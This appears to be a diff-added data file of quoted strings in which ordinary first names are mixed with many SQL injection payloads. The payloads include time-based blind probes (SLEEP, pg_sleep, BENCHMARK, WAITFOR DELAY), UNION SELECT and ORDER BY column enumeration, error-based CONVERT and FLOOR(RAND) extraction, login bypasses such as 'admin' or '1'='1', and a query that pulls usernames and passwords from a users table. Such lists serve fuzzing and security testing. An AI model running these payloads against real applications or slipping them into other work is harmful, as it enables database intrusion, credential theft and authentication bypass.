+'Fran'
+'AnD SLEEP(5)#'
+'Jill'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+'Hank'
+'Grace'
+'John'
+'Charlie'
+'Charlie'
+'Eve'
+'1 or pg_sleep(5)--'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'Grace'
+'Grace'
+'Fran'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#'
+'Grace'
+'admin') or ('1'='1'/*'
+'Alice'
+'Fran'
+'ORDER BY SLEEP(5)'
+'David'
+'Eve'
+'ORDER BY 8#'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--'"
+'OR x=x'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'"
+'OR 3409=3409 AND ('pytW' LIKE 'pytY'
+'Alice'
+"'and (select substring(@@version,2,1))='y''"
+'OR 1=0--'
+'Grace'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Fran'
+'Fran'
+'Hank'
+'Eve'
+'John'
+"'"""";"
+'AND true'
+'%' AND 8310=8310 AND '%'=''
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+'ORDER BY 2#'
+'Eve'
+'Alice'
+'David'
+'Fran'
+'Alice'
+'Fran'
+'';
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'Alice'
+'RLIKE (SELECT (CASE WHEN (4346=4347) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''
+"'') or benchmark(10000000,MD5(1))#'"
+"'UNION SELECT @@VERSION,SLEEP(5),3'"
+'ORDER BY 4'
+'Eve'
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'"
+'' ''
+'Bob'
+'ORDER BY 30#'
+'Alice'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#'"
+'Bob'
+'ORDER BY 16'
+'Eve'
+'David'
+'Bob'
+'1) or sleep(5)#'
+'Charlie'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+'David'
+"'UNION ALL SELECT 1,2,3,4,5'"
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'"
+''''''''''''''UNION SELECT '2'
+'Grace'
+'||		(double pipe) concatenate'
+'John'
+'John'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#'"
+''*''
+'\'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL--'"
+'Charlie'
+'Grace'
+'Alice'
+'John'
+'Eve'
+'David'
+'Bob'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#'"
+'Charlie'
+'Fran'
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))'"
+'Alice'
+'David'
+"'"""") or (""""x"""")=(""""x'"
+'ORDER BY 7#'
+'Eve'
+'OR 1=0#'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'"
+'admin' or '1'='1'--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12#'"
+'HAVING 1=0--'
+'Bob'
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8--'"
+'Comments:'
+"'"""") or (""""x"""")=(""""x'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6#'"
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'"
+'Charlie'
+'John'
+'Grace'
+'Hank'
+'' UNION SELECT sum(columnname ) from tablename --'
+'ORDER BY 2--'
+'David'
+'Grace'
+'Grace'
+'' AND EXISTS(SELECT * FROM users WHERE name = 'admin') --'
+'David'
+"'admin"""") or (""""1""""=""""1""""#'"
+'John'
+'Hank'
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11--'"
+"'AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))'"
+'Hank'
+'Charlie'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+'Hank'
+'Bob'
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))--'"
+'Charlie'
+'Jill'
+'Alice'
+'Fran'
+'AS INJECTX WHERE 1=1 AND 1=0#'
+'Hank'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21--'"
+'Alice'
+"'and (select substring(@@version,2,1))='i''"
+'ORDER BY 22'
+'David'
+''-''
+'Charlie'
+'Bob'
+'Grace'
+'Grace'
+'' OR 'x'='x'
+'Eve'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))nQIP)#'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8'"
+'Hank'
+'Bob'
+'Alice'
+'AND 1=1--'
+'Grace'
+'John'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))'"
+'Eve'
+'Bob'
+'David'
+'Fran'
+'Fran'
+"'UNION SELECT @@VERSION,SLEEP(5),3'"
+'Fran'
+'Fran'
+'Grace'
+'Bob'
+'John'
+'%		wildcard attribute indicator'
+'Jill'
+'Fran'
+'Hank'
+';'
+'Hank'
+'Bob'
+"'1' GROUP BY 1,2,3--+'"
+'Grace'
+'Fran'
+'Bob'
+'Jill'
+'Jill'
+'Eve'
+'Hank'
+'John'
+'David'
+'Eve'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Alice'
+'Charlie'
+'Bob'
+"'AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)'"
+'John'
+'Bob'
+'Fran'
+'Charlie'
+'Fran'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Alice'
+'Fran'
+'David'
+'' or 'x'='x'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2#'"
+'John'
+'Grace'
+'UNION ALL SELECT NULL#'
+'John'
+'' AND id IS NULL; --'
+'Fran'
+'Grace'
+'Fran'
+'Jill'
+'Hank'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#'"
+'Hank'
+'John'
+"'UNION ALL SELECT 1,2,3,4--'"
+'David'
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'Grace'
+'Fran'
+'Alice'
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30'"
+'UNION ALL SELECT NULL--'
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)--'
+'Jill'
+'Fran'
+'Jill'
+'||		(double pipe) concatenate'
+'Alice'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2--'"
+'AND 1=1 AND '%'=''
+'John'
+'Grace'
+'ORDER BY 31337--'
+'Grace'
+'Hank'
+'Charlie'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#'"
+'John'
+'John'
+'';WAITFOR DELAY '0:0:30'--'
+'David'
+'UNION ALL SELECT NULL'
+'David'
+'Charlie'
+'John'
+'Bob'
+'Alice'
+'Hank'
+'Eve'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+'Fran'
+'OR 1=0--'
+'Charlie'
+'John'
+'Fran'
+'David'
+"'admin"""" or 1=1/*'"
+'Alice'
+'Charlie'
+'Charlie'
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''
+'Jill'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A'))'"
+'Bob'
+'Grace'
+'ORDER BY SLEEP(5)#'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23--'"
+'Bob'
+'David'
+'Hank'
+'Alice'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))--'"
+'WHERE 1=1 AND 1=1#'
+"'"""" or """"""""*""""'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19--'"
+'Alice'
+'Fran'
+'Hank'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))--'"
+'Alice'
+'Alice'
+'John'
+'Bob'
+'Eve'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#'"
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))'"
+'Charlie'
+'UNION ALL SELECT 1'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#'"
+'David'
+'Fran'
+'Charlie'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#'"
+'Bob'
+'Jill'
+'OR x=x'
+''));
+'Fran'
+'John'
+'Eve'
+'Eve'
+'Fran'
+'1 or sleep(5)#'
+'Hank'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))'"
+'AS INJECTX WHERE 1=1 AND 1=1--'
+'John'
+'David'
+'John'
+'Grace'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'"
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7#'"
+'Charlie'
+'Jill'
+'Charlie'
+'or SLEEP(5)#'
+'John'
+'ORDER BY 1--'
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'"
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'ORDER BY 25#'
+'AND 7300=7300 AND 'pKlZ'='pKlY'
+'Fran'
+'David'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22--'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17--'"
+'Fran'
+"'-1 UNION SELECT 1 INTO @,@,@'"
+'ORDER BY 13#'
+'Grace'
+'Hank'
+'AND 1=0#'
+'Hank'
+'Alice'
+'WHERE 1=1 AND 1=0#'
+'Jill'
+'Hank'
+'ORDER BY 6'
+'Fran'
+';'
+'ORDER BY 7'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#'"
+'Alice'
+'RLIKE (SELECT (CASE WHEN (4346=4346) THEN 0x61646d696e ELSE 0x28 END)) AND 'Txws'=''
+"'or benchmark(50000000,MD5(1))--'"
+'Charlie'
+'John'
+'David'
+'David'
+'AND (SELECT * FROM (SELECT(SLEEP(5)))YjoC) AND '%'=''
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#'"
+'Hank'
+'David'
+'Grace'
+'Bob'
+'Fran'
+'David'
+'Eve'
+'Fran'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#'"
+"'"""" or true--'"
+'ORDER BY 24'
+'Alice'
+'Grace'
+'Bob'
+'Eve'
+'Grace'
+'Fran'
+'John'
+'ORDER BY 9#'
+'John'
+'David'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'Hank'
+'Eve'
+'SLEEP(5)#'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL--'"
+'Eve'
+"'1234 """" AND 1=0 UNION ALL SELECT """"admin"""", """"81dc9bdb52d04dc20036dbd8313ed055'"
+'Alice'
+"'UNION ALL SELECT USER(),SLEEP(5)--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14'"
+'Hank'
+'Eve'
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20'"
+'Hank'
+'Alice'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'Hank'
+'Eve'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'David'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29'"
+'or 1=1'
+'David'
+'%00'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+'Bob'
+"'""""));"
+'David'
+'Bob'
+'Grace'
+'WHERE 1=1 AND 1=1--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12'"
+'Eve'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26--'"
+'David'
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#'"
+'Bob'
+'ORDER BY 4#'
+'') or ('x')=('x'
+'Charlie'
+'Hank'
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#'"
+'pg_SLEEP(5)--'
+'Alice'
+'Eve'
+'ORDER BY 30#'
+'Jill'
+'John'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29--'"
+'ORDER BY 23--'
+'Charlie'
+'Grace'
+'Bob'
+'David'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20--'"
+'Jill'
+'Grace'
+'Hank'
+'';
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5--'"
+'Hank'
+'David'
+'Jill'
+'Eve'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'"
+'ORDER BY 20'
+'Grace'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28'"
+'John'
+'Bob'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27'"
+'John'
+'David'
+"'' UNION SELECT null, username, password FROM users --'"
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Jill'
+'Charlie'
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#'"
+'Fran'
+'Hank'
+'Hank'
+'David'
+'Jill'
+'Grace'
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18#'"
+'David'
+'Grace'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))'"
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#'"
+'Fran'
+'Jill'
+'AND 0'
+'Bob'
+'Bob'
+"'"""");"
+'or pg_SLEEP(5)'
+'Hank'
+'David'
+"'AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))--'"
+"'UNION SELECT @@VERSION,SLEEP(5),""""'3'"
+'Grace'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))--'"
+'Alice'
+'David'
+'ORDER BY 8--'
+"'and (select substring(@@version,3,1))='S''"
+'Grace'
+"'SLEEP(1)/*' or SLEEP(1) or '"""" or SLEEP(1) or """"*/'"
+'ORDER BY 22'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11#'"
+'Eve'
+'(SELECT * FROM (SELECT(SLEEP(5)))ecMj)'
+'ORDER BY 30'
+'Jill'
+'Eve'
+'Charlie'
+'Charlie'
+''''
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#'"
+"'UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL--'"
+'Bob'
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--'"
+'Charlie'
+'ORDER BY 22'
+'Jill'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21'"
+'Eve'
+'Grace'
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'"
+"'' UNION SELECT 1,2,3 --'"
+'Jill'
+'Alice'
+"'UNION ALL SELECT 1,2,3,4,5,6,7#'"
+'Eve'
+'admin' #'
+'Eve'
+'Bob'
+'John'
+'or 1=1--'
+'Hank'
+'ORDER BY 16--'
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27--'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9'"
+'John'
+'Jill'
+'SLEEP(5)--'
+'Jill'
+'Jill'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18'"
+'Fran'
+'Fran'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3#'"
+'Hank'
+'' UNION SELECT sum(columnname ) from tablename --'
+'UNION ALL SELECT USER()--'
+'John'
+'Eve'
+"'UNION ALL SELECT 1,2'"
+'Grace'
+'Fran'
+'admin' or 1=1/*'
+'Charlie'
+"'admin"""" or 1=1/*'"
+"'UNION ALL SELECT 1,2#'"
+'ORDER BY 17#'
+"'+		addition, concatenate (or space in url)'"
+'David'
+'Eve'
+'David'
+'Hank'
+'David'
+'Alice'
+''-''
+'Bob'
+'Alice'
+'Charlie'
+"'"""" or """"""""-""""'"
+'John'
+'Alice'
+'John'
+'Alice'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'Grace'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26'"
+'Bob'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11,12,13,14'"
+'or pg_SLEEP(5)--'
+'Jill'
+'John'
+'Hank'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+"'UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL--'"
+'John'
+'Bob'
+'ORDER BY 15--'
+'John'
+'Alice'
+'David'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#'"
+'John'
+'ORDER BY 10'
+'John'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19'"
+'ORDER BY 22#'
+'Eve'
+"'admin"""") or (""""1""""=""""1'"
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23'"
+'admin' or '1'='1'
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8--'"
+'Bob'
+'AND 7300=7300 AND 'pKlZ'='pKlY'
+'IF(7423=7423) SELECT 7423 ELSE DROP FUNCTION xcjl--'
+'Charlie'
+"'UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12'"
+'ORDER BY SLEEP(5)--'
+"'UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24'"
+"'""""'"
+"'UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15--'"
+"'admin"""") or """"1""""=""""1'"
+'Charlie'
+'David'
+'Charlie'
+'Fran'
+"'-1 UNION SELECT 1 INTO @,@'"
+"'ORDER BY 1,SLEEP(5),BENCHMARK(1000000,MD5('A')),4,5,6,7,8,9,10,11--'"
+'Charlie'
+'Grace'
+"'+benchmark(3200,SHA1(1))+''"
+"'admin"""" --'"
+'ORDER BY 23'
